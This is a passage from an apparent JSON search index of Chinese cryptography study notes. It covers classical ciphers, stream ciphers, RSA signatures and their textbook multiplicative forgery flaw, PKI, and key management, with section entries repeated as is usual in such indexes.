\u7a77\u4e3e\u653b\u51fb\uff1a\u5df2\u77e5\u5bc6\u6587\uff0c\u660e\u6587\u4e3a\u6709\u610f\u4e49\u5b57\u7b26\uff0c\u81f3\u591a\u5c1d\u8bd526l \u4e2a\uff0c\u53ef\u4ee5\u6062\u590d\u660e\u6587","title":"\u7ef4\u5409\u5c3c\u4e9a\uff08Vigenere\uff09\u5bc6\u7801\u5b89\u5168\u6027\u5206\u6790"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u6362\u4f4d\u5bc6\u7801","text":"\u660e\u6587\u5b57\u6bcd\u4e0d\u53d8\uff0c\u4f46\u987a\u5e8f\u6253\u4e71 \u5217\u6362\u4f4d\uff1a\u9996\u5148\u5c06\u660e\u6587\u6309\u7167\u5bc6\u94a5\u4e2a\u6570\u6392\u5217\uff0c\u7136\u540e\u518d\u6309\u7167\u5bc6\u94a5\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u53d8\u6362\u5217\u7684\u987a\u5e8f\uff0c\u6700\u540e\u6309\u7167\u5217\u7684\u987a\u5e8f\u5199\u51fa\u7684\u5c31\u662f\u5bc6\u6587","title":"\u6362\u4f4d\u5bc6\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/","text":"\u5e8f\u5217\u5bc6\u7801\u4f53\u5236 # \u5e8f\u5217\u5bc6\u7801\u5206\u7c7b # \u81ea\u540c\u6b65\u5e8f\u5217\u5bc6\u7801 # \u540c\u6b65\u5e8f\u5217\u5bc6\u7801 # \u5728\u540c\u6b65\u5e8f\u5217\u5bc6\u7801\u4e2d\uff0c\u5bc6\u94a5\u6d41\u72ec\u7acb\u4e8e\u6d88\u606f\u6d41\u4ea7\u751f \u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 LFSR #","title":"\u5e8f\u5217\u5bc6\u7801\u4f53\u5236"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u5e8f\u5217\u5bc6\u7801\u4f53\u5236","text":"","title":"\u5e8f\u5217\u5bc6\u7801\u4f53\u5236"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u5e8f\u5217\u5bc6\u7801\u5206\u7c7b","text":"","title":"\u5e8f\u5217\u5bc6\u7801\u5206\u7c7b"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u81ea\u540c\u6b65\u5e8f\u5217\u5bc6\u7801","text":"","title":"\u81ea\u540c\u6b65\u5e8f\u5217\u5bc6\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u540c\u6b65\u5e8f\u5217\u5bc6\u7801","text":"\u5728\u540c\u6b65\u5e8f\u5217\u5bc6\u7801\u4e2d\uff0c\u5bc6\u94a5\u6d41\u72ec\u7acb\u4e8e\u6d88\u606f\u6d41\u4ea7\u751f","title":"\u540c\u6b65\u5e8f\u5217\u5bc6\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668-lfsr","text":"","title":"\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 LFSR"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%85%AB%E7%AB%A0%20%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/","text":"\u6570\u5b57\u7b7e\u540d # RSA\u6570\u5b57\u7b7e\u540d # \u53c2\u6570\u4ea7\u751f \u2460\u9009\u62e9\u4e24\u4e2a\u6ee1\u8db3\u9700\u8981\u7684\u5927\u7d20\u6570p\u548cq\uff0c\u8ba1\u7b97n=p\u00d7q, \u03c6(n)= (p-1)\u00d7(q-1)\uff0c\u5176\u4e2d\u03c6(n)\u662fn\u7684\u6b27\u62c9\u51fd\u6570\u503c\u3002 \u2461\u9009\u4e00\u4e2a\u6574\u6570e, \u6ee1\u8db31<e<\u03c6(n)\uff0c\u4e14gcd(\u03c6(n),e)=1\u3002\u901a\u8fc7d\u00d7e\u22611mod\u03c6(n)\uff0c\u8ba1\u7b97\u51fad\u3002 \u2462\u4ee5{e,n}\u4e3a\u516c\u5f00\u5bc6\u94a5\uff0c{d,n}\u4e3a\u79d8\u5bc6\u5bc6\u94a5\u3002 \u7b7e\u540d\u8fc7\u7a0b \u5047\u8bbe\u7b7e\u540d\u8005\u4e3aBob\uff0c\u5219\u53ea\u6709Bob\u77e5\u9053\u79d8\u5bc6\u5bc6\u94a5{d, n}\u3002 \u8bbe\u9700\u8981\u7b7e\u540d\u7684\u6d88\u606f\u4e3am\uff0c\u5219\u7b7e\u540d\u8005Bob\u901a\u8fc7\u5982\u4e0b\u8ba1\u7b97\u5bf9m\u7b7e\u540d\uff1as\u2261md mod n \uff08m, s\uff09\u4e3a\u5bf9\u6d88\u606fm\u7684\u7b7e\u540d\u3002Bob\u5728\u516c\u5171\u5a92\u4f53\u4e0a\u5ba3\u79f0\u4ed6\u53d1\u5e03\u4e86\u6d88\u606fm\uff0c\u540c\u65f6\u628a\u5bf9m\u7684\u7b7e\u540ds\u7f6e\u4e8e\u6d88\u606f\u540e\u7528\u4e8e\u516c\u4f17\u9a8c\u8bc1\u7b7e\u540d\u3002 \u9a8c\u8bc1\u8fc7\u7a0b \u516c\u4f17\u5728\u770b\u5230\u6d88\u606fm\u548c\u5bf9\u5176\u7b7e\u540ds\u540e\uff0c\u5229\u7528Bob\u7684\u516c\u5f00\u9a8c\u8bc1\u5bc6\u94a5{e, n}\u5bf9\u6d88\u606f\u8fdb\u884c\u9a8c\u8bc1\u3002\u516c\u4f17\u8ba1\u7b97\uff1am\u2261se mod n\u662f\u5426\u6210\u7acb\uff0c\u82e5\u6210\u7acb\uff0c\u5219Bob\u7684\u7b7e\u540d\u6709\u6548\u3002\u516c\u4f17\u8ba4\u4e3a\u6d88\u606fm\u7684\u786e\u662fBob\u6240\u53d1\u5e03\uff0c\u4e14\u6d88\u606f\u5185\u5bb9\u6ca1\u6709\u88ab\u7be1\u6539\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u516c\u4f17\u53ef\u4ee5\u5bb9\u6613\u9274\u522b\u53d1\u5e03\u4eba\u53d1\u5e03\u7684\u6d88\u606f\u7684\u5b8c\u6574\u6027\u3002 RSA\u7b7e\u540d\u7b97\u6cd5\u7f3a\u9677 # \u5047\u8bbe\u653b\u51fb\u8005Eve\u60f3\u5f97\u5230\u7b7e\u540d\u8005\u5bf9\u6d88\u606fM\u7684\u7b7e\u540d\uff0c\u5219\u653b\u51fb\u8005Eve\u53ef\u4ee5\u6784\u9020\u6d88\u606fM1\u548cM2\uff0c\u4f7fM=M1 M2\u3002\u7136\u540e\u628a\u6d88\u606fM1\u548cM2\u5206\u522b\u53d1\u9001\u7ed9\u7b7e\u540d\u8005Bob\u8fdb\u884c\u7b7e\u540d\u3002 \uff081\uff09\u8bbeBob\u5bf9\u6d88\u606fM1\u7684\u7b7e\u540d\u4e3aS1\uff0c\u5373S1\u2261M1d mod n\uff1b \uff082\uff09\u8bbeBob\u5bf9\u6d88\u606fM2\u7684\u7b7e\u540d\u4e3aS2\uff0c\u5373S2\u2261M2d mod n\uff1b \u5728\u5f97\u5230Bob\u7684\u4e24\u6b21\u5bf9\u6d88\u606f\u7684\u7b7e\u540d\u540e\uff0c\u5219\u653b\u51fb\u8005Eve\u5f88\u5bb9\u6613\u6784\u9020\u6d88\u606fM\u7684\u7b7e\u540dS\uff0cS= Md=\uff08M1 M2)dmodn\u2261S2*S1\u3002 \u867d\u7136\u8bf4\u5728\u5df2\u77e5M\u7684\u60c5\u51b5\u4e0b\uff0cM1\u3001M2\u5f80\u5f80\u53ea\u662f\u4e00\u4e2a\u6570\u503c\uff0c\u4e00\u822c\u6765\u8bf4\u662f\u6ca1\u6709\u610f\u4e49\u7684\u3002\u4f46\u8fdb\u884c\u7b7e\u540d\u7684\u5f80\u5f80\u662f\u4e00\u53f0\u673a\u5668\uff0c\u4e0d\u4f1a\u5bf9\u6d88\u606f\u6709\u65e0\u610f\u4e49\u8fdb\u884c\u9274\u522b\uff0c\u6545\u5bfc\u81f4\u4e86\u7b97\u6cd5\u7684\u4e0d\u5b89\u5168 RSA\u6539\u8fdb\u7b7e\u540d #","title":"\u6570\u5b57\u7b7e\u540d"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%85%AB%E7%AB%A0%20%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/#\u6570\u5b57\u7b7e\u540d","text":"","title":"\u6570\u5b57\u7b7e\u540d"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%85%AB%E7%AB%A0%20%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/#rsa\u6570\u5b57\u7b7e\u540d","text":"\u53c2\u6570\u4ea7\u751f \u2460\u9009\u62e9\u4e24\u4e2a\u6ee1\u8db3\u9700\u8981\u7684\u5927\u7d20\u6570p\u548cq\uff0c\u8ba1\u7b97n=p\u00d7q, \u03c6(n)= (p-1)\u00d7(q-1)\uff0c\u5176\u4e2d\u03c6(n)\u662fn\u7684\u6b27\u62c9\u51fd\u6570\u503c\u3002 \u2461\u9009\u4e00\u4e2a\u6574\u6570e, \u6ee1\u8db31<e<\u03c6(n)\uff0c\u4e14gcd(\u03c6(n),e)=1\u3002\u901a\u8fc7d\u00d7e\u22611mod\u03c6(n)\uff0c\u8ba1\u7b97\u51fad\u3002 \u2462\u4ee5{e,n}\u4e3a\u516c\u5f00\u5bc6\u94a5\uff0c{d,n}\u4e3a\u79d8\u5bc6\u5bc6\u94a5\u3002 \u7b7e\u540d\u8fc7\u7a0b \u5047\u8bbe\u7b7e\u540d\u8005\u4e3aBob\uff0c\u5219\u53ea\u6709Bob\u77e5\u9053\u79d8\u5bc6\u5bc6\u94a5{d, n}\u3002 \u8bbe\u9700\u8981\u7b7e\u540d\u7684\u6d88\u606f\u4e3am\uff0c\u5219\u7b7e\u540d\u8005Bob\u901a\u8fc7\u5982\u4e0b\u8ba1\u7b97\u5bf9m\u7b7e\u540d\uff1as\u2261md mod n \uff08m, s\uff09\u4e3a\u5bf9\u6d88\u606fm\u7684\u7b7e\u540d\u3002Bob\u5728\u516c\u5171\u5a92\u4f53\u4e0a\u5ba3\u79f0\u4ed6\u53d1\u5e03\u4e86\u6d88\u606fm\uff0c\u540c\u65f6\u628a\u5bf9m\u7684\u7b7e\u540ds\u7f6e\u4e8e\u6d88\u606f\u540e\u7528\u4e8e\u516c\u4f17\u9a8c\u8bc1\u7b7e\u540d\u3002 \u9a8c\u8bc1\u8fc7\u7a0b \u516c\u4f17\u5728\u770b\u5230\u6d88\u606fm\u548c\u5bf9\u5176\u7b7e\u540ds\u540e\uff0c\u5229\u7528Bob\u7684\u516c\u5f00\u9a8c\u8bc1\u5bc6\u94a5{e, n}\u5bf9\u6d88\u606f\u8fdb\u884c\u9a8c\u8bc1\u3002\u516c\u4f17\u8ba1\u7b97\uff1am\u2261se mod n\u662f\u5426\u6210\u7acb\uff0c\u82e5\u6210\u7acb\uff0c\u5219Bob\u7684\u7b7e\u540d\u6709\u6548\u3002\u516c\u4f17\u8ba4\u4e3a\u6d88\u606fm\u7684\u786e\u662fBob\u6240\u53d1\u5e03\uff0c\u4e14\u6d88\u606f\u5185\u5bb9\u6ca1\u6709\u88ab\u7be1\u6539\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u516c\u4f17\u53ef\u4ee5\u5bb9\u6613\u9274\u522b\u53d1\u5e03\u4eba\u53d1\u5e03\u7684\u6d88\u606f\u7684\u5b8c\u6574\u6027\u3002","title":"RSA\u6570\u5b57\u7b7e\u540d"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%85%AB%E7%AB%A0%20%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/#rsa\u7b7e\u540d\u7b97\u6cd5\u7f3a\u9677","text":"\u5047\u8bbe\u653b\u51fb\u8005Eve\u60f3\u5f97\u5230\u7b7e\u540d\u8005\u5bf9\u6d88\u606fM\u7684\u7b7e\u540d\uff0c\u5219\u653b\u51fb\u8005Eve\u53ef\u4ee5\u6784\u9020\u6d88\u606fM1\u548cM2\uff0c\u4f7fM=M1 M2\u3002\u7136\u540e\u628a\u6d88\u606fM1\u548cM2\u5206\u522b\u53d1\u9001\u7ed9\u7b7e\u540d\u8005Bob\u8fdb\u884c\u7b7e\u540d\u3002 \uff081\uff09\u8bbeBob\u5bf9\u6d88\u606fM1\u7684\u7b7e\u540d\u4e3aS1\uff0c\u5373S1\u2261M1d mod n\uff1b \uff082\uff09\u8bbeBob\u5bf9\u6d88\u606fM2\u7684\u7b7e\u540d\u4e3aS2\uff0c\u5373S2\u2261M2d mod n\uff1b \u5728\u5f97\u5230Bob\u7684\u4e24\u6b21\u5bf9\u6d88\u606f\u7684\u7b7e\u540d\u540e\uff0c\u5219\u653b\u51fb\u8005Eve\u5f88\u5bb9\u6613\u6784\u9020\u6d88\u606fM\u7684\u7b7e\u540dS\uff0cS= Md=\uff08M1 M2)dmodn\u2261S2*S1\u3002 \u867d\u7136\u8bf4\u5728\u5df2\u77e5M\u7684\u60c5\u51b5\u4e0b\uff0cM1\u3001M2\u5f80\u5f80\u53ea\u662f\u4e00\u4e2a\u6570\u503c\uff0c\u4e00\u822c\u6765\u8bf4\u662f\u6ca1\u6709\u610f\u4e49\u7684\u3002\u4f46\u8fdb\u884c\u7b7e\u540d\u7684\u5f80\u5f80\u662f\u4e00\u53f0\u673a\u5668\uff0c\u4e0d\u4f1a\u5bf9\u6d88\u606f\u6709\u65e0\u610f\u4e49\u8fdb\u884c\u9274\u522b\uff0c\u6545\u5bfc\u81f4\u4e86\u7b97\u6cd5\u7684\u4e0d\u5b89\u5168","title":"RSA\u7b7e\u540d\u7b97\u6cd5\u7f3a\u9677"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%85%AB%E7%AB%A0%20%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/#rsa\u6539\u8fdb\u7b7e\u540d","text":"","title":"RSA\u6539\u8fdb\u7b7e\u540d"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/","text":"\u516c\u94a5\u5bc6\u7801\u4f53\u5236 # PKI # PKI\u662fPublic Key Infrastructure\u7684\u9996\u5b57\u6bcd\u7f29\u5199\uff0c\u7ffb\u8bd1\u8fc7\u6765\u5c31\u662f\u516c\u94a5\u57fa\u7840\u8bbe\u65bd PKI\u662f\u4e00\u79cd\u9075\u5faa\u6807\u51c6\u7684\u5229\u7528\u516c\u94a5\u52a0\u5bc6\u6280\u672f\u4e3a\u7535\u5b50\u5546\u52a1\u7684\u5f00\u5c55\u63d0\u4f9b\u4e00\u5957\u5b89\u5168\u57fa\u7840\u5e73\u53f0\u7684\u6280\u672f\u548c\u89c4\u8303 \u975e\u5bf9\u79f0\u5bc6\u7801\u4f53\u5236\u5206\u7c7b # \uff081\uff09\u57fa\u4e8e\u5927\u6570\u5206\u89e3\u96be\u9898\u7684\uff0c\u5305\u62ecRSA\u5bc6\u7801\u4f53\u5236\uff0cRabin\u5bc6\u7801\u7b49\u3002 \uff082\uff09\u57fa\u4e8e\u79bb\u6563\u5bf9\u6570\u96be\u9898\u7684\uff0c\u5982ElGamal\u5bc6\u7801\u7b49\u3002 \uff083\uff09\u57fa\u4e8e\u692d\u5706\u66f2\u7ebf\u79bb\u6563\u5bf9\u6570\u7684\u5bc6\u7801\u4f53\u5236\u3002\u4e3a\u6ee1\u8db3\u7535\u5b50\u8ba4\u8bc1\u670d\u52a1\u7cfb\u7edf\u7b49\u5e94\u7528\u9700\u6c42\uff0c\u4e2d\u56fd\u56fd\u5bb6\u5bc6\u7801\u7ba1\u7406\u5c40\u53d1\u5e03\u4e86SM2\u692d\u5706\u66f2\u7ebf\u516c\u94a5\u5bc6\u7801\u7b97\u6cd5\u6807\u51c6\uff0c\u8be5\u6807\u51c6\u63a8\u8350\u4e86\u4e00\u6761256\u4f4d\u7684\u968f\u673a\u692d\u5706\u66f2\u7ebf\u3002 RSA #","title":"\u516c\u94a5\u5bc6\u7801\u4f53\u5236"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u516c\u94a5\u5bc6\u7801\u4f53\u5236","text":"","title":"\u516c\u94a5\u5bc6\u7801\u4f53\u5236"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#pki","text":"PKI\u662fPublic Key Infrastructure\u7684\u9996\u5b57\u6bcd\u7f29\u5199\uff0c\u7ffb\u8bd1\u8fc7\u6765\u5c31\u662f\u516c\u94a5\u57fa\u7840\u8bbe\u65bd PKI\u662f\u4e00\u79cd\u9075\u5faa\u6807\u51c6\u7684\u5229\u7528\u516c\u94a5\u52a0\u5bc6\u6280\u672f\u4e3a\u7535\u5b50\u5546\u52a1\u7684\u5f00\u5c55\u63d0\u4f9b\u4e00\u5957\u5b89\u5168\u57fa\u7840\u5e73\u53f0\u7684\u6280\u672f\u548c\u89c4\u8303","title":"PKI"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#\u975e\u5bf9\u79f0\u5bc6\u7801\u4f53\u5236\u5206\u7c7b","text":"\uff081\uff09\u57fa\u4e8e\u5927\u6570\u5206\u89e3\u96be\u9898\u7684\uff0c\u5305\u62ecRSA\u5bc6\u7801\u4f53\u5236\uff0cRabin\u5bc6\u7801\u7b49\u3002 \uff082\uff09\u57fa\u4e8e\u79bb\u6563\u5bf9\u6570\u96be\u9898\u7684\uff0c\u5982ElGamal\u5bc6\u7801\u7b49\u3002 \uff083\uff09\u57fa\u4e8e\u692d\u5706\u66f2\u7ebf\u79bb\u6563\u5bf9\u6570\u7684\u5bc6\u7801\u4f53\u5236\u3002\u4e3a\u6ee1\u8db3\u7535\u5b50\u8ba4\u8bc1\u670d\u52a1\u7cfb\u7edf\u7b49\u5e94\u7528\u9700\u6c42\uff0c\u4e2d\u56fd\u56fd\u5bb6\u5bc6\u7801\u7ba1\u7406\u5c40\u53d1\u5e03\u4e86SM2\u692d\u5706\u66f2\u7ebf\u516c\u94a5\u5bc6\u7801\u7b97\u6cd5\u6807\u51c6\uff0c\u8be5\u6807\u51c6\u63a8\u8350\u4e86\u4e00\u6761256\u4f4d\u7684\u968f\u673a\u692d\u5706\u66f2\u7ebf\u3002","title":"\u975e\u5bf9\u79f0\u5bc6\u7801\u4f53\u5236\u5206\u7c7b"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/#rsa","text":"","title":"RSA"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/","text":"\u5bc6\u94a5\u7ba1\u7406 # \u5bc6\u94a5\u7ed3\u6784 # \u5c42\u6b21\u5316\u7684\u5bc6\u94a5\u7ba1\u7406\u65b9\u5f0f \u79d8\u94a5\u5206\u7c7b # \u57fa\u672c\u5bc6\u94a5 # \u57fa\u672c\u5bc6\u94a5\uff08Base Key\uff09\uff1a\u53c8\u79f0\u4e3a \u521d\u59cb\u5bc6\u94a5 \uff08primary key\uff09\u6216 \u7528\u6237\u5bc6\u94a5 \uff08user key\uff09\u3002\u5b83\u662f\u7531\u7528\u6237\u9009\u5b9a\u6216\u7531\u7cfb\u7edf\u5206\u914d\u7ed9\u7528\u6237\u7684\uff0c\u53ef\u4ee5\u5728\u8f83\u957f\u65f6\u95f4\u5185\uff08\u76f8\u5bf9\u4e8e\u4f1a\u8bdd\u5bc6\u94a5\uff09\u7531\u4e00\u5bf9\u7528\u6237\uff08\u4f8b\u5982\u5bc6\u94a5\u5206\u914d\u4e2d\u5fc3\u4e0e\u67d0\u4e00\u7528\u6237\u4e4b\u95f4\uff0c\u6216\u8005\u4e24\u4e2a\u7528\u6237\u4e4b\u95f4\uff09\u6240\u4e13\u7528\u7684\u5bc6\u94a5\u3002\u5728\u67d0\u79cd\u7a0b\u5ea6\u4e0a\uff0c\u57fa\u672c\u5bc6\u94a5\u8fd8\u8d77\u5230\u4e86\u6807\u8bc6\u7528\u6237\u7684\u4f5c\u7528\u3002 \u4f1a\u8bdd\u5bc6\u94a5\uff08\u6570\u636e\u52a0\u5bc6\u79d8\u94a5\uff09 # \u5728\u4e00\u6b21\u901a\u4fe1\u6216\u6570\u636e\u4ea4\u6362\u4e2d\uff0c\u7528\u6237\u4e4b\u95f4\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\uff0c\u662f\u7531\u901a\u4fe1\u7528\u6237\u4e4b\u95f4\u8fdb\u884c\u534f\u5546\u5f97\u5230\u7684\u3002\u5b83\u4e00\u822c\u662f\u52a8\u6001\u5730\u3001\u4ec5\u5728\u9700\u8981\u8fdb\u884c\u4f1a\u8bdd\u6570\u636e\u52a0\u5bc6\u65f6\u4ea7\u751f\uff0c\u5e76\u5728\u4f7f\u7528\u5b8c\u6bd5\u540e\u7acb\u5373\u8fdb\u884c\u6e05\u9664\u6389\u7684\uff0c\u4e5f\u79f0\u4e3a \u6570\u636e\u52a0\u5bc6\u5bc6\u94a5 (Data Encrypting Key)\u3002 \u5bc6\u94a5\u52a0\u5bc6\u5bc6\u94a5 # \u4e00\u822c\u662f\u7528\u6765\u5bf9\u4f20\u8f93\u7684\u4f1a\u8bdd\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\u65f6\u91c7\u7528\u7684\u5bc6\u94a5\uff0c\u53c8\u79f0\u4e3a \u4e8c\u7ea7\u5bc6\u94a5 (Secondary Key)\u3002\u5bc6\u94a5\u52a0\u5bc6\u5bc6\u94a5\u6240\u4fdd\u62a4\u7684\u5bf9\u8c61\u662f\u5b9e\u9645\u7528\u6765\u4fdd\u62a4\u901a\u4fe1\u6216\u6587\u4ef6\u6570\u636e\u7684\u4f1a\u8bdd\u5bc6\u94a5\u3002 \u4e3b\u5bc6\u94a5 # \u5bf9\u5e94\u4e8e\u5c42\u6b21\u5316\u5bc6\u94a5\u7ed3\u6784\u4e2d\u7684\u6700\u9ad8\u5c42\u6b21\uff0c\u5b83\u662f\u5bf9\u5bc6\u94a5\u52a0\u5bc6\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\u7684\u5bc6\u94a5\uff0c\u4e3b\u5bc6\u94a5\u5e94\u53d7\u5230\u4e25\u683c\u7684\u4fdd\u62a4\u3002 \u5bc6\u94a5\u5206\u5c42\u7ba1\u7406 # D-H\u5bc6\u94a5\u534f\u5546 # \u4e2d\u95f4\u4eba\u653b\u51fb # \u5bc6\u94a5\u5206\u914d\u6280\u672f # \u5bc6\u94a5\u5206\u914d\u6280\u672f\u4e00\u822c\u9700\u8981\u89e3\u51b3\u4e24\u4e2a\u65b9\u9762\u7684\u95ee\u9898\uff1a\u4e3a\u51cf\u8f7b\u8d1f\u62c5\uff0c\u63d0\u9ad8\u6548\u7387\uff0c\u5f15\u5165\u81ea\u52a8\u5bc6\u94a5\u5206\u914d\u673a\u5236\uff1b\u4e3a\u63d0\u9ad8\u5b89\u5168\u6027\uff0c\u5c3d\u53ef\u80fd\u51cf\u5c11\u7cfb\u7edf\u4e2d\u9a7b\u7559\u7684\u5bc6\u94a5\u91cf\u3002 \u4e3a\u4e86\u6ee1\u8db3\u8fd9\u4e24\u4e2a\u95ee\u9898\uff0c\u76ee\u524d\u6709\u4e24\u79cd\u7c7b\u578b\u7684\u5bc6\u94a5\u5206\u914d\u65b9\u6848\uff1a \u96c6\u4e2d\u5f0f \u548c \u5206\u5e03\u5f0f \u5bc6\u94a5\u5206\u914d\u65b9\u6848\u3002 \u96c6\u4e2d\u5f0f\u5bc6\u94a5\u5206\u914d\u65b9\u6848 # \u96c6\u4e2d\u5f0f\u5bc6\u94a5\u5206\u914d\u65b9\u6848\u662f\u6307\u7531\u5bc6\u94a5\u5206\u914d\u4e2d\u5fc3\uff08KDC\uff09\u6216\u8005\u7531\u4e00\u7ec4\u8282\u70b9\u7ec4\u6210\u5c42\u6b21\u7ed3\u6784\u8d1f\u8d23\u5bc6\u94a5\u7684\u4ea7\u751f\u5e76\u5206\u914d\u7ed9\u901a\u4fe1\u53cc\u65b9\u3002 \u5206\u5e03\u5f0f\u5bc6\u94a5\u5206\u914d\u65b9\u6848 # \u5206\u5e03\u5f0f\u5bc6\u94a5\u5206\u914d\u65b9\u6848\u662f\u6307\u7f51\u7edc\u901a\u4fe1\u4e2d\u5404\u4e2a\u901a\u4fe1\u65b9\u5177\u6709\u76f8\u540c\u7684\u5730\u4f4d\uff0c\u5b83\u4eec\u4e4b\u95f4\u7684\u5bc6\u94a5\u5206\u914d\u53d6\u51b3\u4e8e\u5b83\u4eec\u4e4b\u95f4\u7684\u534f\u5546\uff0c\u4e0d\u53d7\u4f55\u5176\u4ed6\u65b9\u7684\u9650\u5236\uff08\u66f4\u8fdb\u4e00\u6b65\uff0c\u53ef\u4ee5\u628a\u5bc6\u94a5\u5206\u914d\u4e2d\u5fc3\u5206\u6563\u5230\u6240\u6709\u7684\u901a\u4fe1\u65b9\uff0c\u5373\u6bcf\u4e2a\u901a\u4fe1\u65b9\u540c\u65f6\u4e5f\u662f\u5bc6\u94a5\u5206\u914d\u4e2d\u5fc3\uff09\u3002","title":"\u5bc6\u94a5\u7ba1\u7406"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/#\u5bc6\u94a5\u7ba1\u7406","text":"","title":"\u5bc6\u94a5\u7ba1\u7406"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/#\u5bc6\u94a5\u7ed3\u6784","text":"\u5c42\u6b21\u5316\u7684\u5bc6\u94a5\u7ba1\u7406\u65b9\u5f0f","title":"\u5bc6\u94a5\u7ed3\u6784"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/#\u79d8\u94a5\u5206\u7c7b","text":"","title":"\u79d8\u94a5\u5206\u7c7b"},{"location":"%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%8D%81%E7%AB%A0%20%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/#\u57fa\u672c\u5bc6\u94a5","text":"\u57fa\u672c\u5bc6\u94a5\uff08Base Key\uff09\uff1a\u53c8\u79f0\u4e3a \u521d\u59cb\u5bc6\u94a5 \uff08primary key\uff09\u6216 \u7528\u6237\u5bc6\u94a5 \uff08user 